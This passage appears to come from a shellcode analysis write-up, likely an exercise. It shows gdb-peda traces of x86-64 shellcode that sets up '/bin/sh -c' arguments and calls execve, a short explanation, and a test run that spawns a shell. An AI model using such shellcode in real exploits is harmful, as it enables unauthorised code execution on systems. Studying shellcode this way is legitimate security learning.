0048| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
0056| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601088 in code ()
gdb-peda$ 





















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe488 --> 0x632d ('-c')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe470 --> 0x7fffffffe488 --> 0x632d ('-c')
RIP: 0x601089 --> 0x50fe6894857 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x601089 <code+41>:	push   rdi
   0x60108a <code+42>:	mov    rsi,rsp
   0x60108d <code+45>:	syscall 
   0x60108f <code+47>:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe470 --> 0x7fffffffe488 --> 0x632d ('-c')
0008| 0x7fffffffe478 --> 0x601080 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffe480 --> 0x0 
0024| 0x7fffffffe488 --> 0x632d ('-c')
0032| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0040| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0048| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0056| 0x7fffffffe4a8 --> 0x601060 --> 0x622fbb4899583b6a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601089 in code ()
gdb-peda$ 





















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe488 --> 0x632d ('-c')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe468 --> 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x60108a --> 0x50fe68948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x60108a <code+42>:	mov    rsi,rsp
   0x60108d <code+45>:	syscall 
   0x60108f <code+47>:	add    BYTE PTR [rax],al
   0x601091:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe468 --> 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe470 --> 0x7fffffffe488 --> 0x632d ('-c')
0016| 0x7fffffffe478 --> 0x601080 --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7fffffffe480 --> 0x0 
0032| 0x7fffffffe488 --> 0x632d ('-c')
0040| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0048| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0056| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060108a in code ()
gdb-peda$ 





















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x7fffffffe468 --> 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RDI: 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe468 --> 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x60108d --> 0x50f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601082 <code+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x56006873
   0x601089 <code+41>:	push   rdi
   0x60108a <code+42>:	mov    rsi,rsp
=> 0x60108d <code+45>:	syscall 
   0x60108f <code+47>:	add    BYTE PTR [rax],al
   0x601091:	add    BYTE PTR [rax],al
   0x601093:	add    BYTE PTR [rax],al
   0x601095:	add    BYTE PTR [rax],al
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe468 --> 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe470 --> 0x7fffffffe488 --> 0x632d ('-c')
0016| 0x7fffffffe478 --> 0x601080 --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7fffffffe480 --> 0x0 
0032| 0x7fffffffe488 --> 0x632d ('-c')
0040| 0x7fffffffe490 --> 0x68732f6e69622f ('/bin/sh')
0048| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0056| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060108d in code ()
gdb-peda$ 
process 5627 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x40059a

gdb-peda$ 
```

The shellcode creates the argument structure on the stack pointing to '/bin/sh' command, then executes it through the execve system call.
Proof of execution:

```
$ ./shellcode3
Shellcode Length:  13
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ 
```